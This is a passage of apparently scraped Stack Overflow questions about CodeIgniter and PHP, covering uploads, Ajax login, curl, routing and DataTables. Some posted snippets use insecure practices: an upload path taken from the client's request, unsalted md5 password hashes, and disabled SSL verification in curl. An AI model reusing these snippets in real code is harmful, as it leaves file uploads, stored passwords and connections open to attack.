'112.5' (length=5)\n      'name' =&gt; string 'Business Card' (length=13)\n      'ship' =&gt; \n        array (size=3)\n          'Ground' =&gt; float 9.73\n          '2nd Day Air' =&gt; float 18.54\n          'Overnight' =&gt; float 26.27\n      'options' =&gt; \n        array (size=2)\n          'Print Package' =&gt; string 'Pro' (length=3)\n          'Design Package' =&gt; string 'Premium' (length=7)\n      'subtotal' =&gt; float 112.5\n\n  '675d8a197a25e6720af7ac05707fee40' =&gt; \n    array (size=8)\n      'rowid' =&gt; string '675d8a197a25e6720af7ac05707fee40' (length=32)\n      'id' =&gt; string '102' (length=3)\n      'qty' =&gt; string '1' (length=1)\n      'price' =&gt; string '446' (length=3)\n      'name' =&gt; string 'Booklet' (length=7)\n      'ship' =&gt; \n        array (size=3)\n          'Ground' =&gt; float 14.45\n          '2nd Day Air' =&gt; float 22.57\n          'Overnight' =&gt; float 34.12\n      'options' =&gt; \n        array (size=2)\n          'Print Package' =&gt; string 'Plus' (length=4)\n          'Design Package' =&gt; string 'Ultimate' (length=8)\n      'subtotal' =&gt; int 446\n\n  'aea5d2f84151e65a0a1e50371aad26aa' =&gt; \n    array (size=8)\n      'rowid' =&gt; string 'aea5d2f84151e65a0a1e50371aad26aa' (length=32)\n      'id' =&gt; string '102' (length=3)\n      'qty' =&gt; string '1' (length=1)\n      'price' =&gt; string '325' (length=3)\n      'name' =&gt; string 'Booklet' (length=7)\n      'ship' =&gt; \n        array (size=3)\n          'Ground' =&gt; float 14.45\n          '2nd Day Air' =&gt; float 22.57\n          'Overnight' =&gt; float 34.12\n      'options' =&gt; \n        array (size=2)\n          'Print Package' =&gt; string 'Pro' (length=3)\n          'Design Package' =&gt; string 'Premium' (length=7)\n      'subtotal' =&gt; int 325\n</code></pre>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12784369,"title":"CodeIgniter Facebook API getuser always 0","body":"<p>I know this is a duplicate, however, I've tried pretty much everything suggested in the other questions.</p>\n\n<p>I'm currently getting a redirect loop because getUser is always returning 0, even after approving the app.</p>\n\n<p>Code:</p>\n\n<pre><code>public function auth() {\n    $user = $this-&gt;facebook-&gt;getUser();\n\n    if ($user) {\n        $user = $this-&gt;facebook-&gt;api('/me');\n        if (!$this-&gt;Users-&gt;getByID($user[\"id\"])) {\n            $this-&gt;data-&gt;needsRegister = true;\n        } else {\n            $toSetInSessions = new stdClass();\n            $toSetInSessions-&gt;authed = 1;\n            $dbUser = $this-&gt;Users-&gt;getByID($user[\"id\"]);\n            foreach ($dbUser as $key =&gt; $value) {\n                $toSetInSessions-&gt;user-&gt;$key = $value;\n            }\n            $this-&gt;session-&gt;set_userdata($toSetInSessions);\n            redirect(\"/\");\n        }\n    } else {\n        $params = array('scope' =&gt; 'email,read_friendlists');\n        if ($_SERVER['HTTP_USER_AGENT'] != \"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)\") {\n            redirect($this-&gt;facebook-&gt;getLoginUrl($params));\n        }\n    }\n\n    $this-&gt;load-&gt;view('header', $this-&gt;data);\n    $this-&gt;load-&gt;view('auth', $this-&gt;data);\n    $this-&gt;load-&gt;view('footer', $this-&gt;data);\n}\n</code></pre>\n\n<p>Here is the screenshot of my settings page for this App.</p>\n\n<p><a href=\"https://dl.dropbox.com/u/6647629/facebookapp.png\" rel=\"nofollow\">https://dl.dropbox.com/u/6647629/facebookapp.png</a></p>\n\n<p>Sometimes it does work, but most of the time it doesn't.</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12771853,"title":"How to load captcha script to CI?","body":"<p>I have captcha script (image.php) which generate image:</p>\n\n<pre><code>&lt;img src=\"/application/libraries/captcha/image.php\" onclick=\"javascript:reloadCaptcha()\" id=\"captcha\" title=\"Click to reload image\" alt=\"Click to reload image\"&gt;\n</code></pre>\n\n<p>Question: how can I load this image?</p>\n\n<p>Direct access to example.com/application/libraries/captcha/image.php — 403 error.</p>\n\n<p>Captcha site: <a href=\"http://www.php-help.ro/php-tutorials/math-capcha-image-against-spam/\" rel=\"nofollow\">http://www.php-help.ro/php-tutorials/math-capcha-image-against-spam/</a></p>\n"},{"tags":["php","arrays","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":11879146,"title":"Associative arrays - create dynamically (CodeIgniter)","body":"<p>I have form in Code Igniter and I want to use helper <code>form_dropdown()</code>. In order to do it I have to prepare associative array like this:</p>\n\n<pre><code>$options = array(\n              'small'  =&gt; 'Samsung',\n              'med'    =&gt; 'Apple',\n              'large'   =&gt; 'HTC',\n              'xlarge' =&gt; 'Nokia',\n            );\n</code></pre>\n\n<p>But in this view this data are transferred from controller, which are taken from model, of course. </p>\n\n<pre><code>        $this-&gt;db-&gt;select('id');\n        $query  = $this-&gt;db-&gt;get('ci_table1');\n\n    if ($query-&gt;num_rows() &gt; 0 )\n    {\n        foreach ($query-&gt;result() as $row) \n        {\n           $data[] = $row; \n        };\n    };\n\n    $id_data['id'] = $data;\n\n    $this-&gt;load-&gt;view('update_record_view', $id_data);\n</code></pre>\n\n<p>So, on the side of view I have the <code>foreach</code>-loop:</p>\n\n<pre><code> foreach ($id as $row) \n          {\n             // this I want to construct associative array\n          }\n</code></pre>\n\n<p>Question is follow: how to create associative array at my case dynamically?</p>\n"},{"tags":["php","codeigniter","uploadify"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12784167,"title":"Uploadify with Codeigniter - File replace check","body":"<p>Ok so I have Uploadify working great on Codeigniter. It uploads and everything fine. </p>\n\n<p>However, the code that I'm using checks to see if there's a file on the system with the same filename as the file the user is trying to upload. It then prompts them to either replace the current file, or cancel.</p>\n\n<p>I need to remove that prompt, and just add a 1 to the end of the filename if the file already exists. Code is below (sorry there's so much of it). </p>\n\n<p>This is the code on the upload page:</p>\n\n<pre><code>$(document).ready(function(){\n\n                    $(\"#upload\").uploadify({\n                            uploader        :   '&lt;? echo base_url();?&gt;assets/uploadify/uploadify.swf',\n                            script          :   '&lt;? echo base_url();?&gt;assets/uploadify/uploadify.php',\n                            cancelImg       :   '&lt;? echo base_url();?&gt;assets/uploadify/cancel.png',\n                            folder          :   'assets/photos/highres',\n                            'sizeLimit'     :   5242880,\n                            scriptAccess    :   'always',\n                            multi           :   true,\n                            auto            :   true,\n                            'onError'       :   function (a, b, c, d) {\n                                                    if (d.status == 404)\n                                                        alert('Could not find upload script.');\n                                                    else if (d.type === \"HTTP\")\n                                                        alert('error '+d.type+\": \"+d.status);\n                                                    else if (d.type ===\"File Size\")\n                                                        alert(c.name+' '+d.type+' Limit: '+Math.round(d.sizeLimit/1024)+'KB');\n                                                    else\n                                                        alert('error '+d.type+\": \"+d.text);\n                                                    },\n                            'checkScript'   :   'assets/uploadify/check.php',\n                            'onCheck'       :   function(event,data,key) {\n                                                    $('#file_upload' + key).find('.percentage').text(' - Exists');\n                                                    },\n                            'onComplete'    :   function (event, queueID, fileObj, response, data) {\n                                                    //Post response back to controller\n                                                    $.post('&lt;?php echo site_url('upload/do_upload');?&gt;',{title: $(\"#title\").val(), byline: $(\"#byline\").val(), source: $(\"#source\").val(), keywords: $(\"#keywords\").val(), category: $(\"#category\").val(), retain_iptc: $(\"#retain_iptc:checked\").val(), caption: $(\"#caption\").val(), filearray : response},function(info){\n                                                    $(\"#target\").append(info);  //Add response returned by controller                                                                         \n                                                    });\n                                                    }\n\n                    });             \n        });\n</code></pre>\n\n<p>This is the check.php file code:</p>\n\n<pre><code>$fileArray = array();\nforeach ($_POST as $key =&gt; $value) {\n    if ($key != 'folder') {\n        if (file_exists($_SERVER['DOCUMENT_ROOT'] . $_POST['folder'] . '/' . $value)) {\n            $fileArray[$key] = $value;\n        }\n    }\n}\necho json_encode($fileArray);\n</code></pre>\n\n<p>And this is the uploadify.php file code:</p>\n\n<pre><code>    function set_filename($path, $filename, $file_ext, $encrypt_name = FALSE)\n    {\n        if ($encrypt_name == TRUE)\n        {       \n            mt_srand();\n            $filename = md5(uniqid(mt_rand())).$file_ext;   \n        }\n\n        if ( ! file_exists($path.$filename))\n        {\n            return $filename;\n        }\n\n        $filename = str_replace($file_ext, '', $filename);\n\n        $new_filename = '';\n        for ($i = 1; $i &lt; 100; $i++)\n        {           \n            if ( ! file_exists($path.$filename.$i.$file_ext))\n            {\n                $new_filename = $filename.$i.$file_ext;\n                break;\n            }\n        }\n\n        if ($new_filename == '')\n        {\n            return FALSE;\n        }\n        else\n        {\n            return $new_filename;\n        }\n    }\n\n    function prep_filename($filename) {\n       if (strpos($filename, '.') === FALSE) {\n          return $filename;\n       }\n       $parts = explode('.', $filename);\n       $ext = array_pop($parts);\n       $filename    = array_shift($parts);\n       foreach ($parts as $part) {\n          $filename .= '.'.$part;\n       }\n       $filename .= '.'.$ext;\n       return $filename;\n    }\n\n    function get_extension($filename) {\n       $x = explode('.', $filename);\n       return '.'.end($x);\n    } \n\nif (!empty($_FILES)) {\n    $path = $_SERVER['DOCUMENT_ROOT'] . $_REQUEST['folder'] . '/';\n   //$client_id = $_GET['client_id'];\n   $file_temp = $_FILES['Filedata']['tmp_name'];\n   $file_name = prep_filename($_FILES['Filedata']['name']);\n   $file_ext = get_extension($_FILES['Filedata']['name']);\n   $real_name = $file_name;\n   $newf_name = set_filename($path, $file_name, $file_ext);\n   $file_size = round($_FILES['Filedata']['size']/1024, 2);\n   $file_type = preg_replace(\"/^(.+?);.*$/\", \"\\\\1\", $_FILES['Filedata']['type']);\n   $file_type = strtolower($file_type);\n   $targetFile =  str_replace('//','/',$path) . $newf_name;\n   move_uploaded_file($file_temp,$targetFile);\n\n   $filearray = array();\n   $filearray['file_name'] = $newf_name;\n   $filearray['real_name'] = $real_name;\n   $filearray['file_ext'] = $file_ext;\n   $filearray['file_size'] = $file_size;\n   $filearray['file_path'] = $targetFile;\n   $filearray['file_temp'] = $file_temp;\n   //$filearray['client_id'] = $client_id;\n\n   $json_array = json_encode($filearray);\n   echo $json_array;\n}else{\n    echo \"1\";   \n}\n</code></pre>\n"},{"tags":["jquery","ajax","json","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12780588,"title":"Codeigniter Ajax Login issue","body":"<p>I'm building an Ajax login with Codeigniter &amp; Jquery... I have a small issue with returning an 'Invalid Login' message and its bugging me.</p>\n\n<p>On the login page I have:</p>\n\n<pre><code>$(document).keypress(function (e) {\n    if (e.which == 13) {\n        var login = $(\"#login\").val();\n        var pass = $(\"#pass\").val();\n\n        $('#login-block').removeBlockMessages().blockMessage('Please wait, cheking login...', {\n            type: 'loading'\n        });\n        $.post(\"&lt;?php echo base_url(); ?&gt;index.php/login/validate_credentials/\", {\n            username: login,\n            password: pass\n        }, function (data) {\n            if (data.error) {\n                $('#login-block').removeBlockMessages().blockMessage(data.message, {\n                    type: 'error'\n                });\n            } else {\n                document.location.href = data.redirect;\n            }\n        }, \"json\");\n    }\n});\n</code></pre>\n\n<p>The <code>validate()</code> function simply queries the DB for the username and password matching, if the num_rows = 1 then it returns the users data.</p>\n\n<p>All this works ok when attempting to login, but when I enter a username that doesn't exist I DONT get the 'Incorrect Login' error...</p>\n\n<p>If I use a real username and false password I do get the error.</p>\n\n<p>And if the username and pass are correct it logs in ok.</p>\n\n<p>I just dont understand why it wont display and error when the username doesn't exist?</p>\n\n<p><strong>Edit</strong></p>\n\n<p>Here is my Validate() function in the model.</p>\n\n<pre><code>function validate() {\n\n    // CHECK LOGIN DETAILS\n    $this-&gt;db-&gt; select('first_name,last_name,usertype,id,products,mac');\n    $this-&gt;db-&gt; where('username', $this-&gt;input-&gt;post('username'));\n    $this-&gt;db-&gt; where('password', md5($this-&gt;input-&gt;post('password')));\n    $query = $this-&gt;db-&gt;get('membership');\n\n    if ($query-&gt;num_rows() &gt; 0) {\n        $data = array('usertype' =&gt; $row-&gt;usertype, 'userid' =&gt; $row-&gt;id, 'first_name' =&gt; $row-&gt;first_name, 'last_name' =&gt; $row-&gt;last_name, 'products' =&gt; $row-&gt;products, 'mac' = &gt; $row-&gt;mac);\n        return $data;\n    }\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":51,"score":-1,"question_id":12778507,"title":"Show part of an array once?","body":"<p>I've got my array with multiple values in it and im doing a foreach statement to output all off the values into a style.</p>\n\n<p>I've got 2 objects in the array that are the same across all rows and I need to show them once, at the top of everything as a header as you would.</p>\n\n<p>The objects are:</p>\n\n<pre><code>[Manufacturer] =&gt; Samsung [Model] =&gt; Galaxy Nexus\n</code></pre>\n\n<p>My current code is:</p>\n\n<pre><code>foreach($array as $row) {\n    echo $row-&gt;column1;\n    echo $row-&gt;column2;\n    echo $row-&gt;column3;\n}\n</code></pre>\n\n<p>I thought maybe a while loop, however I'm not sure.  Also, this is being done in a CodeIgniter View and the query being pulled from a model if that makes any difference.</p>\n"},{"tags":["php","templates","cakephp","codeigniter"],"answer_count":9,"favorite_count":10,"up_vote_count":16,"down_vote_count":0,"view_count":19213,"score":16,"question_id":1029960,"title":"How to Deal With Codeigniter Templates?","body":"<p>I'm fairly new to MVC, and I've found CodeIgniter recently. I'm still learning everyday, but one problem is its template engine. What is the best way to create templates in CodeIgniter?</p>\n\n<p>CakePHP comes with its own template library, is there a similar feature in CodeIgniter?</p>\n"},{"tags":["php","http","codeigniter","url","curl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":121,"score":0,"question_id":12781590,"title":"CURL returns response code 200 and 0 for a same page at different time","body":"<p>I am facing one unusual behavior of curl. For a given page, I some times get HTTP response code as 200 and sometimes I get 0 as HTTP response code. I am not able to understand whether this page is valid or not. If you try the given code, please try it for at least 5-10 times so that you can see the difference. </p>\n\n<pre><code>function print_info()\n{\n    $url = 'bart.no';\n    $arr = array(\n    'bart.no',\n    'bolandirekt.nu',\n    'ekompassen.com',\n    'ekompassen.nu',\n    );\n\n    foreach ($arr as $url)\n    {\n        echo \"&lt;br/&gt;URL: \" . $url;\n        $temp = str_replace(array(\"www.\", \"http://\", \"https://\"), \"\", strtolower($url));\n\n        // From this array it will be decided which is to prepend\n        $pre_array = array(\"\", \"www.\", \"https://\", \"http://\", \"https://www.\", \"http://www.\");\n        $status_code = array();\n\n        // For each Value Status will be stored\n        foreach ($pre_array as $pre)\n        {\n\n            $options = array(\n                CURLOPT_RETURNTRANSFER =&gt; TRUE, // return web page\n                CURLOPT_HEADER =&gt; TRUE, // don't return headers\n                CURLOPT_FOLLOWLOCATION =&gt; FALSE, // follow redirects\n                CURLOPT_ENCODING =&gt; \"\", // handle all encodings\n                CURLOPT_USERAGENT =&gt; \"spider\", // who am i\n                CURLOPT_AUTOREFERER =&gt; FALSE, // set referer on redirect\n                CURLOPT_SSL_VERIFYHOST =&gt; FALSE, //ssl verify host\n                CURLOPT_SSL_VERIFYPEER =&gt; FALSE, //ssl verify peer\n                CURLOPT_NOBODY =&gt; FALSE,\n                CURLOPT_CONNECTTIMEOUT =&gt; 20, // timeout on connect\n                CURLOPT_TIMEOUT =&gt; 20, // timeout on response\n            );\n\n            // Initializing Curl\n            $ch = curl_init($pre . $temp);\n            // Set Curl Options\n            curl_setopt_array($ch, $options);\n            // Execute Curl\n            $content = curl_exec($ch);\n\n            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n            echo \"&lt;pre/&gt;\";\n            if ($code == 200)\n            {\n                print_r(curl_getinfo($ch));\n                break;\n            }           \n                            curl_close($ch);\n        }\n    }\n}\n</code></pre>\n\n<p>So my final doubt is : Why I am getting response code 200 for the pages which are not existing Or not opening in browser ? Also, why sometimes I get response code 0 and sometimes response code 200 for the same page even if I keep time interval between requests ?</p>\n"},{"tags":["php","mysql","codeigniter","navigation","nested-sets"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12780575,"title":"php nested set, building links in navigation menu","body":"<p>I have a few categories in my database which I am retrieving <a href=\"http://mikehillyer.com/articles/managing-hierarchical-data-in-mysql/\" rel=\"nofollow\">using nested set model</a> something like this(number in brackets represent depth):</p>\n\n<p>New(1)<br />\n-General(2)<br />\n-Console(2)</p>\n\n<p>Games(1)<br />\n-pc(2)<br />\n--emulator(3)<br />\n-ps3(2)</p>\n\n<p>I then have a function to handle the multidimensional array and generate the navigation menu<br /><br />\n<b>--the model</b><br />\nthis returns the following array from database<br></p>\n\n<pre><code>Array (\n    [0] =&gt; Array ( [name] =&gt; News [depth] =&gt; 1 ) \n    [1] =&gt; Array ( [name] =&gt; General [depth] =&gt; 2 ) \n    [2] =&gt; Array ( [name] =&gt; Console [depth] =&gt; 2 ) \n    [4] =&gt; Array ( [name] =&gt; Games [depth] =&gt; 1 ) \n    [5] =&gt; Array ( [name] =&gt; PC [depth] =&gt; 2 ) \n    [6] =&gt; Array ( [name] =&gt; emulator [depth] =&gt; 3 ) \n    [8] =&gt; Array ( [name] =&gt; ps3 [depth] =&gt; 2 ) \n) \n</code></pre>\n\n<p><b>--the controller</b><br /></p>\n\n<pre><code>public function index()\n{\n$navTree = $this-&gt;getNavTree(); //gets array from model\n$createNavTree = $this-&gt;_renderTree($navTree); //pass array to function\n$this-&gt;load-&gt;view('testnavigation.php', $createNavTree);\n}\n\n\nfunction _renderTree($tree){    \n    $current_depth = 0;\n    $counter = 0;\n\n    $result = '';\n\n    foreach($tree as $node){\n        $node_depth = $node['depth'];\n        $node_name = $node['name'];\n        $node_id = $node['categoryid'];\n\n        if($node_depth == $current_depth){\n            if($counter &gt; 0) $result .= '&lt;/li&gt;';            \n        }\n        elseif($node_depth &gt; $current_depth){\n\n            $result .= $counter == 0 ? '&lt;ul id=\"nav\"&gt;' : '&lt;ul&gt;';\n            $current_depth = $current_depth + ($node_depth - $current_depth);\n        }\n        elseif($node_depth &lt; $current_depth){\n            $result .= str_repeat('&lt;/li&gt;&lt;/ul&gt;',$current_depth - $node_depth).'&lt;/li&gt;';\n            $current_depth = $current_depth - ($current_depth - $node_depth);\n        }\n        $result .= '&lt;li&gt;&lt;a href=\"#\"&gt;'.$node_name.'&lt;/a&gt;';\n        ++$counter;\n    }\n    $result .= str_repeat('&lt;/li&gt;&lt;/ul&gt;',$node_depth).'&lt;/li&gt;';\n    $result .= '&lt;/ul&gt;';     \n    return $result;\n}\n</code></pre>\n\n<p><b>--view</b></p>\n\n<pre><code>echo $createNavTree;\n</code></pre>\n\n<p>The list is created in the correct indented order, the issue I am having however is generating the links for each item\nfor instance the link for emulator should be mysite.com/games/pc/emulator</p>\n\n<p>How would I go about achieving this, any help be appreciated thanks?</p>\n"},{"tags":["codeigniter","internationalization","routes","controllers"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12781879,"title":"CodeIgniter: Multilanguage when controllers hidden","body":"<p>Please help me. My situation is when I hide the index.php and controllers name on url like this:</p>\n\n<p>localhost/ctc/index.php/controllers/function/ ==> localhost/ctc/function</p>\n\n<p>It work fine and after that, I want multilanguage in my site and use tutorial from this site: <a href=\"http://maestric.com/doc/php/codeigniter_i18n\" rel=\"nofollow\">http://maestric.com/doc/php/codeigniter_i18n</a>, my url turn to:</p>\n\n<p>localhost/ctc/function ==> localhost/ctc/en/function or localhost/ctc/fr/function</p>\n\n<p>Problem is, when I change language from france to english, the current page turn to english (of course), but when I click to other pages, language come back to default language is france and I can't figure out why.</p>\n\n<p>This is my routes.php:</p>\n\n<pre><code>    $route['default_controller'] = \"main/main_page\";\n    $route['en/main/(:any)'] = \"main/$1\";\n    $route['fr/main/(:any)'] = \"main/$1\";\n    $route['en/(:any)'] = \"main/$1\";\n    $route['fr/(:any)'] = \"main/$1\";\n    $route['(:any)'] = \"main/$1\";\n    $route['^(en|fr)/(.+)$'] = \"$1\";\n    $route['^(en|fr)$'] = $route['default_controller'];\n    $route['404_override'] = '';\n</code></pre>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12778975,"title":"Make Codeigniter ignore directory","body":"<p>I have Codeigniter installed and working for my main site. </p>\n\n<p>But I am now trying to add an add-on domain to the same hosting account, so I can have two sites running on the same hosting. Add-on domains make a new folder in the main public_html folder to store the web files. </p>\n\n<p>How can I get Codeigniter to ignore this directory? The site doesn't load properly when I try and view it. </p>\n\n<p>I have an SSL on the main site too and redirection for www URLS. Here's my .htaccess file:</p>\n\n<pre><code>RewriteEngine on\nOptions +FollowSymLinks\nRewriteBase /\n\nRewriteCond %{HTTP_HOST} ^www\\.mysite\\.co.uk$ [NC]\nRewriteRule ^(.*)$ http://mysite.co.uk/$1 [L,R=301]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /index.php/$1\n\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} (site|sections|here)\nRewriteRule ^(.*)$ https://%{SERVER_NAME}%{REQUEST_URI} [R=301,L]\n\nRewriteCond %{HTTPS} onsite|sections|here)\nRewriteRule ^(.*)$ http://%{SERVER_NAME}%{REQUEST_URI} [R=301,L]\n</code></pre>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12780189,"title":"How to load view from application/myfolder/ path in CodeIgniter","body":"<p>I was loading view in CodeIgniter as</p>\n\n<pre><code>$this-&gt;load-&gt;view('../../myfolder/footer');\n</code></pre>\n\n<p>It was working fine on windows machine. I have uploaded app to linux machine and start getting error</p>\n\n<pre><code>Unable to load the requested file: ../../myfolder/header.php\n</code></pre>\n\n<p>myfolder is in CI application folder.</p>\n\n<p>How can i load view from application/myfolder</p>\n\n<p>Please help me and thank you in advance.</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12773639,"title":"Codeigniter image upload image (upside down for some images)","body":"<p>I got a weird problem when uploading images via \"upload\" library.</p>\n\n<p>When i have huge pics, like 1,8mb big it always uploads them upside down.</p>\n\n<p>Otherwise it gets uploaded normally.</p>\n\n<p>my model for upload looks like this</p>\n\n<pre><code>function do_upload() {\n\n    $this-&gt;gallery_path = realpath(APPPATH . '../public/images');\n\n    $config = array(\n        'upload_path' =&gt; $this-&gt;gallery_path,\n        'allowed_types' =&gt; 'jpg|jpeg|gif|png',\n        'max_size' =&gt; 2000\n    );\n\n    $this-&gt;load-&gt;library('upload',$config);\n    $this-&gt;upload-&gt;do_upload();\n    $image_data = $this-&gt;upload-&gt;data();\n\n    //to db\n    $filename=$image_data['file_name'];\n\n    $this-&gt;db-&gt;set('name', $filename);\n    $this-&gt;db-&gt;insert('images');\n\n}\n</code></pre>\n\n<p>could anyone please just explain why it gets like this? I've tried to increase max size to see if it would help but it didn't.</p>\n\n<p>Would be more than thankful for some help :)</p>\n"},{"tags":["codeigniter","ssl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12780826,"title":"CodeIgniter SSL","body":"<p>Im developing an app with CodeIgniter, mainly for learning purposes.</p>\n\n<p>Im currently addressing the issue of security in my app and one thing I read about is using SSL.</p>\n\n<p>I tried to figure out what I have to do in order to use SSL in my app. Since I'll have a small number of users I thought about using SSL on all of my sites.</p>\n\n<p>In another question for SSL in CI I found this:</p>\n\n<pre><code>$config['base_url'] = \"https://www.yoursite.com/\";\n</code></pre>\n\n<p>Is this all I have to configure to use SSL? Do I have to buy a certificate somewhere? Are there any prerequisites for my server?</p>\n\n<p>Thanks in advance for your help!</p>\n"},{"tags":["php","arrays","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12780573,"title":"php: i have 5 array, how can i make them as one?","body":"<pre><code>    foreach($archive as $archrow){\n        echo $archrow-&gt;doc_name;   //document name\n        echo $archrow-&gt;doc_status; //document status\n    }\n\n    foreach($arc as $arcrow){\n        echo $arcrow-&gt;fullname; //Author\n    }\n\n    foreach($pos as $posrow){\n        echo $posrow-&gt;position_name;  //position\n\n    }\n\n    foreach($loc as $locrow){\n\n        echo $locrow-&gt;location;  //Department\n    }\n</code></pre>\n\n<p>i would like to make a table and arrange them by category like this:</p>\n\n<pre><code>________________________________________________________________________________\n</code></pre>\n\n<p>|Document name |  Author   |   Position   |  Department  |   Document Status     |</p>\n\n<hr>\n\n<p>|  asdasd      |  john     |    Manager   |  Acct        |    adsads             |</p>\n"},{"tags":["php","jquery","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12737756,"title":"How can I get the value of a selected dropdown before posting the page","body":"<pre><code>&lt;?php \n\n$options = array(\n                  500  =&gt; 500,\n                  1000 =&gt; 1000,\n                  2500 =&gt; 2500,\n                  5000 =&gt; 5000,\n                );\n\necho form_dropdown('units',$options);\n\n?&gt;\n\n$db_num = 25; # a random number\n$post_num = $set_num * (units-selected) \n</code></pre>\n\n<p>how do i get multiply the selected value of of the units dropdown with my <code>$db_num</code> when submit is clicked? I think this may need javascript but is it possible without?</p>\n\n<p>On my controller I tried this:</p>\n\n<pre><code>$db_num = $this-&gt;input-&gt;post('db_num');\n$units = $this-&gt;input-&gt;post('units');\n\n$answer = $db_num * $units;\n\n...\n\necho $answer; \n</code></pre>\n\n<p>(result is no error and no insert. What am I doing wrong?) </p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12743647,"title":"CodeIgniter view doesn't load","body":"<p>I have an on-going CI v2.0.2 app that was coded by other developers.</p>\n\n<p>I started off by creating a <code>trial</code> controller: `controllers/trial/trial.php'. The code in this controller is:</p>\n\n<pre><code>&lt;h1&gt;controller&lt;/h1&gt;\n&lt;?php\n\nclass Trial extends CI_Controller {\n\n    function index() {\n        echo \"this works\";\n        $this-&gt;load-&gt;view(\"trial/trial_view\");\n    }\n}\n</code></pre>\n\n<p>And the view is in <code>views/trial/trial_view.php</code>. The view has a simple <code>&lt;p&gt;this is the view&lt;/p&gt;</code> line.</p>\n\n<p>Now when I visit the URL - <code>http://localhost/ci/index.php/trial/trial</code> all I get is the <code>&lt;h1&gt;</code> tag from the controller. If I remove that tag, nothing is seen, not even the <code>echo</code> statement.</p>\n\n<p>The code base I was given is an exact replica of the app that is being used right now. I've doubly checked to make sure the folder structure is correct too.</p>\n\n<p>What should be going on here? Any config options I should look at?</p>\n\n<h2>Update--------</h2>\n\n<p>I moved <code>trial.php</code> into the <code>controllers</code> folder, and <code>trial_view.php</code> into the <code>views</code> folder. Made the appropriate changes in the code too. But the result is still the same - only the <code>h1</code> tag from the controller is displayed when I visit <code>http://localhost/ci/index.php/trial</code></p>\n"},{"tags":["codeigniter","datatables"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":454,"score":0,"question_id":11355542,"title":"Jquery DataTable with Ignited-Datatables CodeIgniter","body":"<p><strong>Update:</strong></p>\n\n<blockquote>\n  <p>I finally found the solution for this problem. If you face the same\n  problem as mine, you can try visit this <a href=\"http://codeigniter.com/forums/viewthread/160896/P340/#1013662\" rel=\"nofollow\">link </a></p>\n</blockquote>\n\n<p>I am having problem when want to integrate <a href=\"http://datatables.net\" rel=\"nofollow\">Jquery DataTables</a> with  <a href=\"https://github.com/IgnitedDatatables/Ignited-Datatables\" rel=\"nofollow\">CodeIgniter Ignited-Datatables</a> library</p>\n\n<p>When I use the default DataTables <strong>sServerMethod</strong> property which is \"GET\", I got the json response with data from my php. However since CodeIgniter use post, I stuck at loading server data although the function return me correct json output.</p>\n\n<p><img src=\"http://i.stack.imgur.com/Q3WEH.png\" alt=\"enter image description here\"></p>\n\n<p>So I follow this <a href=\"http://gvlatko.com/2012/datables-stuck-on-server-side-processing-solution-for-codeigniter-with-ignitedtables/\" rel=\"nofollow\">guide </a> to change the <strong>sServerMethod</strong> to \"POST\". Now I dont stuck at loading server data, but I dont get the data that I need.</p>\n\n<p>JSON response using <strong>sServerMethod</strong> GET (get correct json, but stuck at loading server data as in the image)</p>\n\n<pre><code>{\n\"sEcho\": 0,\n\"iTotalRecords\": 10,\n\"iTotalDisplayRecords\": 10,\n\"aaData\": [\n    [\n        \"Munauwar\",\n        \"Syed\",\n        \"Mr\",\n        \"6012345678\",\n        \"0000-00-00\",\n        \"basikal\"\n    ],        \n    [\n        \"Mak\",\n        \"Je Wei\",\n        \"Mr\",\n        \"6012345678\",\n        \"0000-00-00\",\n        \"motor\"\n    ]\n],\n\"sColumns\": \"first_name,last_name,salutation,number,birthday,group_name\"}\n</code></pre>\n\n<p>JSON response using <strong>sServerMethod</strong> POST</p>\n\n<pre><code>{\n\"sEcho\": 1,\n\"iTotalRecords\": 10,\n\"iTotalDisplayRecords\": 0,\n\"aaData\": [],\n\"sColumns\": \"first_name,last_name,salutation,number,birthday,group_name\"}\n</code></pre>\n\n<p>This is my javascript code</p>\n\n<pre><code>$('#table1').dataTable({\n        \"bProcessing\": true,\n        \"bServerSide\": true,            \n        \"sPaginationType\": \"bootstrap\",\n        \"sAjaxSource\": config.base_url + \"contact/popup_contact\",\n        \"sServerMethod\": \"POST\"\n\n    });\n</code></pre>\n\n<p>My function in contact 